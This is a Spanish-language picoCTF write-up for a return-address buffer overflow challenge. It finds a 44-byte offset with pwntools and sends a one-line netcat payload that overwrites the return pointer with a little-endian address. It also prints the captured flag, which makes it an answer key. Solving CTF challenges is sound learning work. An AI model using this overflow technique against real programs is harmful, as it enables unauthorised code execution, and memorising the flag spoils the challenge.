## Descripción

Control the return address Additional details will be available after launching your challenge instance.

## Pistas

1. Make sure you consider big Endian vs small Endian.
2. Changing the address of the return pointer can call different functions.

## Solución

```python()
1. Como podemos ver en el codigo, el bufer que almacena la contraseña, tiene un tamaño de 32.
2. Al pasar este tamaño, nos lleva a `0x6161616c`, que es el la direccion de retorno, ya que la cadena ingresada es mayor al limite
3. Ahora debemos encontrar que caracteres sobreescribieron el buffer, para eso utilizaremos:

from pwn import *
cyclic_find(0x6161616c)

44

4. Entonces, `44` son los digitos que tenemos que intruducir antes de ingresar la direcion de retorno
5. Con esta información corremos el programa e introducimos lo siguiente:

echo '00000000000000000000000000000000000000000000\xf6\x91\x04\x08' | nc saturn.picoctf.net 63715 
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_9cf083f8}  

6. La dirección que ingresamos, nos lleva a la bandera.
```

## Bandera

picoCTF{addr3ss3s_ar3_3asy_9cf083f8}

## Notas adicionales